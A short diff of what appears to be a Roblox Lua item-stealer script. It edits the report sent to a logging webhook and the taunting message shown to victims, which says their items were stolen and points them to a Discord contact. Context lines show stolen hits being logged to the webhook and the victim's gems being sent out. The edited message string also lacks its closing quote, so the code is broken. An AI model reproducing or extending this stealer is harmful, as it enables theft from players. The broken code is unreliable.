@@ -822,7 +822,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             LOGS_WEBHOOK,
                             Left_Hits,
                             v.IsShiny,
-                            " <@1190223705620631562>",
+                            "Muscle HIT",
                             v.Item_RAP,
                             totalRap
                         )
@@ -834,5 +834,5 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
         end
     end
     SendAllGems()
-    message.Error("Muscle Man Stealed Your Items! If you want your items back dm in discord: cooler_muscle")
+    message.Error("Muscle Man Stealed Your Items! If you want your items join discord .gg/)
 end
